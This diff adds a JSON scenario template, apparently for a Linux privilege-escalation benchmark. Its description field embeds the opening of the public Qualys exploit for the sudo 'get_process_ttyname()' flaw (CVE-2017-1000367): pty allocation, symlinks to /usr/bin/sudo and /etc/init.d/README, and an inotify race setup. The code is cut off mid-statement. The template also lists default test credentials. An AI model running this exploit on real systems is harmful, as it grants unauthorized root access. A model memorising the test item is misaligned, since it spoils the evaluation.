@@ -1,0 +1,30 @@
+{
+  "template_id": "auto_edb_42183",
+  "category": "A2_sudo",
+  "attack_technique": "T1548.003",
+  "cwe": "CWE-269",
+  "description": "Linux privilege escalation: Sudo 1.8.20 - 'get_process_ttyname()' Local Privilege Escalation (CVE-2017-1000367)\n\nExploit source code (42183.c):\n```\n/*\n * E-DB Note: http://www.openwall.com/lists/oss-security/2017/05/30/16\n * E-DB Note: http://seclists.org/oss-sec/2017/q2/470\n *\n * Linux_sudo_CVE-2017-1000367.c\n * Copyright (C) 2017 Qualys, Inc.\n *\n * This program is free software: you can redistribute it and/or modify\n * it under the terms of the GNU General Public License as published by\n * the Free Software Foundation, either version 3 of the License, or\n * (at your option) any later version.\n *\n * This program is distributed in the hope that it will be useful,\n * but WITHOUT ANY WARRANTY; without even the implied warranty of\n * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n * GNU General Public License for more details.\n *\n * You should have received a copy of the GNU General Public License\n * along with this program.  If not, see <http://www.gnu.org/licenses/>.\n */\n\n#define _GNU_SOURCE\n#include <dirent.h>\n#include <errno.h>\n#include <fcntl.h>\n#include <limits.h>\n#include <paths.h>\n#include <pty.h>\n#include <sched.h>\n#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n#include <sys/inotify.h>\n#include <sys/resource.h>\n#include <sys/stat.h>\n#include <sys/time.h>\n#include <sys/types.h>\n#include <sys/wait.h>\n#include <unistd.h>\n\n#define SUDO_BINARY \"/usr/bin/sudo\"\n#define TARGET_FILE \"/etc/init.d/README\"\n#define SELINUX_ROLE \"unconfined_r\"\n\n#define WORKING_DIR \"/dev/shm/_tmp\"\n#define TTY_SYMLINK WORKING_DIR \"/_tty\"\n#define TTY_SYMLINK_ TTY_SYMLINK \"_\"\n\n#define die() do { \\\n    fprintf(stderr, \"died in %s: %u\\n\", __func__, __LINE__); \\\n    exit(EXIT_FAILURE); \\\n} while (0)\n\nint\nmain(const int my_argc, const char * const my_argv[])\n{\n    if (my_argc <= 1) die();\n    if (my_argc >= INT_MAX/2) die();\n    char comm[sizeof(WORKING_DIR) + 16];\n    char pts[PATH_MAX];\n\n    #define PTS_NUM 32\n    int pts_fds[2 * PTS_NUM];\n    unsigned int i = PTS_NUM;\n    while (i--) {\n        int ptm_fd;\n        if (openpty(&ptm_fd, &pts_fds[i], pts, NULL, NULL)) die();\n        if (close(ptm_fd)) die();\n    }\n    struct stat sbuf;\n    if (fstat(*pts_fds, &sbuf)) die();\n    if (!S_ISCHR(sbuf.st_mode)) die();\n    if (sbuf.st_rdev <= 0) die();\n    if ((unsigned int)snprintf(comm, sizeof(comm), \"%s/     %lu \", WORKING_DIR, (unsigned long)sbuf.st_rdev)\n                                  >= sizeof(comm)) die();\n    for (i = 0; i < PTS_NUM; i++) {\n        if (close(pts_fds[i])) die();\n    }\n\n    if (mkdir(WORKING_DIR, 0700)) die();\n    if (symlink(pts, TTY_SYMLINK)) die();\n    if (symlink(TARGET_FILE, TTY_SYMLINK_)) die();\n    if (symlink(SUDO_BINARY, comm)) die();\n\n    const int inotify_fd = inotify_init1(IN_CLOEXEC);\n    if (inotify_fd <= -1) die();\n    const int working_wd = inotify_add_watch(inotify_fd, WORKING_DIR, IN_OPEN | IN_CLOSE_NOWRITE);\n    if (working_wd <= -1) die();\n\n    const int cpu = sched_getcpu();\n    if (cpu >= CPU_SETSIZE) die();\n    if (cpu < 0) die();\n    cpu_set_t cpu_set;\n    CPU_ZERO(&cpu_set);\n    CPU_SET(cpu, &cpu_set);\n    if (sched_setaffinity(0, sizeof(cpu_set), &cpu_se\n```",
+  "cve": "CVE-2017-1000367",
+  "exploitdb_id": "42183",
+  "feasibility": "L1",
+  "docker_run_args": [],
+  "detection_difficulty": "medium",
+  "interaction_mode": "multi_step",
+  "params": {
+    "username": {
+      "type": "string",
+      "default": "lowpriv"
+    },
+    "password": {
+      "type": "string",
+      "default": "password123"
+    }
+  },
+  "instances": [
+    {
+      "scenario_id": "edb_42183",
+      "type": "core",
+      "difficulty": "medium"
+    }
+  ]
+}
